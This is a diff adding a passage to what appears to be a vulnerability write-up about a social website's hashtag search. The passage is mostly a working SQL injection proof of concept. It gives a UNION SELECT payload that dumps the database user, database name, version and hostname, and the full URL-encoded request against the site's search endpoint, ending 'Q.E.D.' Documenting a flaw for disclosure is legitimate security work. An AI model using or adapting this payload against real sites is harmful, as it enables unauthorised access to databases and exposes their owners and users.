@@ -82,3 +82,21 @@ But, nothing showed, just something like this.
 I tried to expand the code, and here is what I got:
 ![error](./008.png)
 
+
+And here we go!
+
+I plugged this payload
+```
+" and 0 union select 'Hacked by Ammar Faizi',user(),database(),version(),@@hostname,6 -- -+
+```
+
+So the endpoint will be
+```
+https://sphere.social/hello/search/hashtags/%22+and+0+union+select+%27Hacked+by+Ammar+Faizi%27%2Cuser%28%29%2Cdatabase%28%29%2Cversion%28%29%2C%40%40hostname%2C6+--+-%2B
+```
+
+Here is what I got:
+![error](./009.png)
+
+
+## End of proof, Q.E.D.
